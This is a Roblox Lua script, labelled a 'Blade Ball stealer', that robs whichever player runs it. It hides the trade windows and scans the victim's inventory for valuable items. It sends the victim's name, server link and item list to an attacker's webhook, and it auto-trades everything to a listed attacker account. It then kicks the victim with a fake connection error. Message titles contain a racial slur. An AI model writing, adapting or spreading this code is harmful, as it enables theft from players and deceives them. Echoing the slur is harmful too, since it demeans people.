_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local auth_token = _G.AuthToken or "" 

-- Vérifications de sécurité de base
if next(users) == nil or webhook == "" then
    plr:kick("Missing Config")
    return
end

if game.PlaceId ~= 13772394625 then
    plr:kick("Only works on normal servers")
    return
end

-- Vérification du code PIN (Reset bypass)
local args = { [1] = { ["option"] = "PIN", ["value"] = "9079" } }
local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
if PINReponse ~= "You don't have a PIN code" then
    plr:kick("Please disable trade PIN")
    return
end

-- Masquage de l'interface
tradeGui.Black.Visible = false
tradeGui.MiscChat.Visible = false
tradeCompleteGui.Black.Visible = false
tradeCompleteGui.Main.Visible = false
local maintradegui = tradeGui.Main
maintradegui.Visible = false
maintradegui:GetPropertyChangedSignal("Visible"):Connect(function() maintradegui.Visible = false end)

-- Fonction de formatage (Ex: 1880 -> 1.88k)
local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        return string.format("%.2f%s", number, suffixes[suffixIndex])
    end
end

local totalRAP = 0

-- FONCTION D'ENVOI (JOIN MESSAGE + TRI)
local function SendJoinMessage(list, prefix)
    local grouped = {}
    for _, item in ipairs(list) do
        if grouped[item.Name] then
            grouped[item.Name].Count = grouped[item.Name].Count + 1
            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
        else
            grouped[item.Name] = { Name = item.Name, Count = 1, TotalRAP = item.RAP }
        end
    end

    local groupedList = {}
    for _, group in pairs(grouped) do table.insert(groupedList, group) end

    -- TRI DU PLUS GROS RAP AU PLUS PETIT (Wind Thorn en premier)
    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)

    local itemText = ""
    for _, group in ipairs(groupedList) do
        itemText = itemText .. string.format("⭐ %s (x%s) - %s RAP\n", group.Name, group.Count, formatNumber(group.TotalRAP))
    end

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["auth_token"] = auth_token, -- Token pour Cloudflare
        ["embeds"] = {{
            ["title"] = "🟣 Bro join your hit nigga 🎯",
            ["color"] = 8323327,
            ["fields"] = {
                { name = "Victim Username 🤖:", value = plr.Name, inline = true },
                { name = "Join link 🔗:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId },
                { name = "Item list 📝:", value = itemText ~= "" and itemText or "No items", inline = false },
                { name = "Summary 💰:", value = "Total RAP: " .. formatNumber(totalRAP), inline = false }
            },
            ["footer"] = { ["text"] = "Blade Ball stealer by Eblack" }
        }}
    }
    
    pcall(function()
        HttpService:PostAsync(webhook, HttpService:JSONEncode(data))
    end)
end

-- FONCTION D'ENVOI FINAL (TRADE RÉUSSI)
local function SendMessage(list)
    local grouped = {}
    for _, item in ipairs(list) do
        if grouped[item.Name] then
            grouped[item.Name].Count = grouped[item.Name].Count + 1
            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
        else
            grouped[item.Name] = { Name = item.Name, Count = 1, TotalRAP = item.RAP }
        end
    end

    local groupedList = {}
    for _, group in pairs(grouped) do table.insert(groupedList, group) end

    -- TRI DU PLUS GROS RAP AU PLUS PETIT
    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)

    local itemText = ""
    for _, group in ipairs(groupedList) do
        itemText = itemText .. string.format("✅ %s (x%s) - %s RAP\n", group.Name, group.Count, formatNumber(group.TotalRAP))
    end

    local data = {
        ["auth_token"] = auth_token,
        ["embeds"] = {{
            ["title"] = "🟣 The nigga is on the server 🎉",
            ["color"] = 8323327,
            ["fields"] = {
                { name = "Victim Username 🤖:", value = plr.Name, inline = true },
                { name = "Items sent 📝:", value = itemText ~= "" and itemText or "None", inline = false },
                { name = "Summary 💰:", value = "Total RAP: " .. formatNumber(totalRAP), inline = false }
            },
            ["footer"] = { ["text"] = "Blade Ball stealer by Eblack" }
        }}
    }

    pcall(function()
        HttpService:PostAsync(webhook, HttpService:JSONEncode(data))
    end)
end

-- RÉCUPÉRATION DU RAP
local rapDataResult = Replion.Client:GetReplion("ItemRAP")
local rapData = rapDataResult.Data.Items

local function getRAP(category, itemName)
    local categoryData = rapData[category]
    if not categoryData then return 0 end
    for serializedKey, rap in pairs(categoryData) do
        local success, decodedKey = pcall(function() return HttpService:JSONDecode(serializedKey) end)
        if success and type(decodedKey) == "table" then
            for _, pair in ipairs(decodedKey) do
                if pair[1] == "Name" and pair[2] == itemName then return rap end
            end
        end
    end
    return 0
end

-- SCAN INVENTAIRE
for _, category in ipairs(categories) do
    for itemId, itemInfo in pairs(clientInventory[category]) do
        if not itemInfo.TradeLock then
            local rap = getRAP(category, itemInfo.Name)
            if rap >= min_rap then
                totalRAP = totalRAP + rap
                table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
            end
        end
    end
end

-- LOGIQUE DE TRADE
if #itemsToSend > 0 then
    -- Tri des items du plus cher au moins cher pour le trade
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)

    local backupItems = {}
    for i, v in ipairs(itemsToSend) do backupItems[i] = v end

    local prefix = (ping == "Yes") and "@everyone " or ""
    SendJoinMessage(itemsToSend, prefix)

    local function doTrade(targetName)
        while #itemsToSend > 0 do
            pcall(function() netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(game.Players:WaitForChild(targetName)) end)
            repeat task.wait(0.5) until tradeGui.Enabled

            local count = 0
            while #itemsToSend > 0 and count < 100 do
                local item = table.remove(itemsToSend, 1)
                pcall(function() netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID) end)
                count = count + 1
            end

            pcall(function() netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true) end)
            pcall(function() netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer() end)
            repeat task.wait(0.1) until not tradeGui.Enabled
        end
        plr:kick("Please check your internet connection (Error Code: 277)")
    end

    -- Attente du compte de trade
    local function start()
        for _, p in ipairs(Players:GetPlayers()) do
            if table.find(users, p.Name) then
                SendMessage(backupItems)
                doTrade(p.Name)
                return
            end
        end
    end

    start()
    Players.PlayerAdded:Connect(function(p)
        if table.find(users, p.Name) then
            SendMessage(backupItems)
            doTrade(p.Name)
        end
    end)
end
